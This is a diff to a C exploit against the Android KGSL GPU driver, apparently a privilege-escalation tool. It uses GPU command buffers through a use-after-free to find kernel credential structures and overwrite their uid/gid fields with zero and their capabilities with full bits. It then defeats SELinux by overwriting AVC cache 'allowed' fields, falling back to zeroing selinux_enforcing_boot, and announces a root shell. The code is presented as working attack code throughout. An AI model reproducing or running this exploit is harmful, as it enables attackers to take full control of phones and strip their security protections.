@@ -207,7 +207,8 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
-    printf("[*] Phase 6: GPU scan for cred pages\n");
+    // ========== Phase 6: GPU scan for cred pages ==========
+    printf("[*] Phase 6: GPU scan for cred pages (pattern 0x000007D0)\n");
     unsigned int ctx_id = create_context(kgsl_fd);
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
     void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
@@ -265,94 +266,149 @@ int main(int argc, char **argv) {
     }
     printf("\n[*] Phase 6 complete: found %d cred pages\n", n_cred);
 
-    if (n_cred == 0) {
-        printf("[-] No cred pages found, aborting\n");
-        return 1;
+    // ========== Phase 7: Overwrite cred fields (uid=0, caps=full) ==========
+    if (n_cred > 0) {
+        printf("[*] Phase 7: Overwrite cred fields (uid=0, caps=full)\n");
+        for (int p = 0; p < n_cred && p < 32; p++) {
+            uint64_t cbase = cred_pages[p] + cred_offs[p];
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            memset(ib_m, 0, 0x10000);
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+
+            // uid, gid, euid, egid, suid, sgid, fsuid, fsgid を 0 に
+            uint64_t uid_base = cbase + 0x04;
+            for (int i = 0; i < 8; i++) {
+                uint32_t al, ah;
+                split64(uid_base + i * 4, &al, &ah);
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+                cmd[dw++] = al; cmd[dw++] = ah;
+                cmd[dw++] = 0;
+            }
+
+            // capabilities (CapPrm, CapEff, CapInh, CapBnd) をフルに設定
+            uint64_t cap_base = cbase + 0x28;
+            for (int i = 0; i < 4; i++) {
+                uint32_t al, ah;
+                split64(cap_base + i * 8, &al, &ah);
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
+                cmd[dw++] = al; cmd[dw++] = ah;
+                cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0xFFFFFFFF;
+            }
+
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+        }
+        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        printf("[+] Cred overwrite done\n");
+    } else {
+        printf("[-] No cred pages found, root shell may not work\n");
     }
 
-    printf("[*] Phase 7: Overwrite cred fields (uid=0, caps=full)\n");
-    for (int p = 0; p < n_cred && p < 32; p++) {
-        uint64_t cbase = cred_pages[p] + cred_offs[p];
+    // ========== Phase 8: AVC bypass (SELinux permissive via UAF) ==========
+    printf("[*] Phase 8: GPU scan for AVC cache pages (UAF area)\n");
+    // Use larger scan for AVC (1024 dwords)
+    #undef SCAN_DWORDS
+    #define AVC_SCAN_DWORDS 1024
+    uint64_t avc_vas[256];
+    int n_avc = 0;
+    // Reuse dst_m, ib_m; but need to ensure dst_m is large enough (0x4000 = 1024 dwords)
+    // We'll keep dst_m size 0x4000 and scan 1024 dwords (4096 bytes) per page
+    for (uint64_t va = scan_start; va < end_va && n_avc < 256; va += 0x1000) {
+        if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
-        memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < AVC_SCAN_DWORDS; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i * 4, &dl, &dh);
+            split64(va + i * 4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0;
+            cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
+        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
+        __sync_synchronize();
 
-        // uid, gid, euid, egid, suid, sgid, fsuid, fsgid を 0 に
-        uint64_t uid_base = cbase + 0x04;
-        for (int i = 0; i < 8; i++) {
+        uint32_t *d = (uint32_t *)dst_m;
+        int ahits = 0;
+        // AVC node structure: 72 bytes per entry, 56 entries per page (approx)
+        // Check for valid ssid, tsid, tclass, and pprev pointer pattern
+        for (int ofs = 0; ofs < 4032; ofs += 72) {
+            int idx = ofs / 4;
+            if (idx + 13 >= AVC_SCAN_DWORDS) break;
+            uint32_t ssid = d[idx];
+            uint32_t tsid = d[idx+1];
+            uint32_t tclass = d[idx+2] & 0xFFFF;
+            uint32_t pprev_hi = d[idx+13];
+            if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
+                tclass > 0 && tclass < 1000 && (pprev_hi >> 16) == 0xFFFF) {
+                ahits++;
+            }
+        }
+        if (ahits >= 3) {
+            printf("\n  [AVC] va=0x%lx ahits=%d\n", (unsigned long)va, ahits);
+            avc_vas[n_avc] = va;
+            n_avc++;
+        }
+    }
+    printf("\n[*] Found %d AVC pages\n", n_avc);
+
+    if (n_avc > 0) {
+        printf("[*] Phase 8b: Overwrite AVC allowed fields (0xFFFFFFFF)\n");
+        for (int p = 0; p < n_avc; p++) {
+            memset(ib_m, 0, 0x10000);
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            for (int slot = 0; slot < 4032; slot += 72) {
+                uint64_t allowed_addr = avc_vas[p] + slot + 12;
+                uint32_t al, ah;
+                split64(allowed_addr, &al, &ah);
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+                cmd[dw++] = al; cmd[dw++] = ah;
+                cmd[dw++] = 0xFFFFFFFF;
+            }
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+        }
+        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        printf("[+] AVC allowed overwritten\n");
+    } else {
+        printf("[-] No AVC pages found, trying direct SELinux zeroing as fallback\n");
+        // Fallback: direct write to selinux_enforcing_boot (less reliable)
+        {
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            memset(ib_m, 0, 0x10000);
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            uint64_t enforcing_boot_addr = FIXED_ENFORCING_BOOT;
             uint32_t al, ah;
-            split64(uid_base + i * 4, &al, &ah);
+            split64(enforcing_boot_addr, &al, &ah);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
             cmd[dw++] = al; cmd[dw++] = ah;
             cmd[dw++] = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+            flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+            printf("[+] Fallback: selinux_enforcing_boot zeroed (may not work)\n");
         }
-
-        // capabilities (CapPrm, CapEff, CapInh, CapBnd) をフルに設定
-        uint64_t cap_base = cbase + 0x28;
-        for (int i = 0; i < 4; i++) {
-            uint32_t al, ah;
-            split64(cap_base + i * 8, &al, &ah);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
-            cmd[dw++] = al; cmd[dw++] = ah;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0xFFFFFFFF;
-        }
-
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx_id, ts);
-    }
-    flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-    printf("[+] Cred overwrite done\n");
-
-    // SELinux を確実に permissive にする (二重の手法)
-    printf("[*] Phase 8: Disable SELinux (zero selinux_enforcing_boot and selinux_state)\n");
-
-    // 手法1: selinux_enforcing_boot を 0 に
-    {
-        uint32_t *cmd = (uint32_t *)ib_m;
-        int dw = 0;
-        memset(ib_m, 0, 0x10000);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        uint64_t enforcing_boot_addr = FIXED_ENFORCING_BOOT;
-        uint32_t al, ah;
-        split64(enforcing_boot_addr, &al, &ah);
-        cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-        cmd[dw++] = al; cmd[dw++] = ah;
-        cmd[dw++] = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx_id, ts);
-        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-        printf("[+] selinux_enforcing_boot zeroed\n");
-    }
-
-    // 手法2: selinux_state の先頭 0x20 バイトをゼロクリア (保険)
-    {
-        uint32_t *cmd = (uint32_t *)ib_m;
-        int dw = 0;
-        memset(ib_m, 0, 0x10000);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        uint64_t selinux_state_addr = FIXED_SELINUX_STATE;
-        for (int off = 0; off < 0x20; off += 4) {
-            uint64_t addr = selinux_state_addr + off;
-            uint32_t al, ah;
-            split64(addr, &al, &ah);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-            cmd[dw++] = al; cmd[dw++] = ah;
-            cmd[dw++] = 0;
-        }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx_id, ts);
-        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-        printf("[+] selinux_state zeroed (first 0x20 bytes)\n");
     }
 
     printf("[*] Phase 9: Cache eviction\n");
@@ -369,7 +425,7 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
     pid_t winner = 0;
-    if (poll(&pfd, 1, 10000) > 0 &&
+    if (poll(&pfd, 1, 15000) > 0 &&
         read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
         printf("[+] ROOT! uid=0 at PID %d\n", winner);
         printf("＼(^o^)／\n");
